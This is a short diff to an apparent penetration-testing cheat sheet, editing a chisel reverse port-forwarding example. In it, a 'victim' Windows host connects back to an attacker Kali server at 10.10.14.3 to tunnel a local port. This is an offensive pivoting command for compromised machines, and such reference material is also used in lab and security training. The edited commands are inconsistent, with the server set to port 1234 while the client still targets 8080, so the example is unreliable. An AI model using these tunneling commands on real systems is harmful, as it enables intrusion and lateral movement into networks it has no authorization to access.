@@ -174,8 +174,8 @@ chmod +x chisel
 ### Windows Port Forwarding <a id="socks"></a>
 
 ```text
-username@kali: ./chisel server -p 8080 --reverse
-C:\Users\victim> ./chisel-x64.exe client 10.10.14.3:8080 R:socks
+username@kali: ./chisel server -p 1234 --reverse
+C:\Users\victim> ./chisel-x64.exe client 10.10.14.3:8080 R:8082:127.0.0.1:8082
 ```
 
 ### Linux Port forwarding <a id="port-forwarding"></a>
